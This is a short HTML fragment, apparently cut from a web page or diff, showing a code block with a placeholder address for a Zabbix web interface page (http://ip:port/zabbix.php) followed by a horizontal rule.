+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;zabbix.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
 
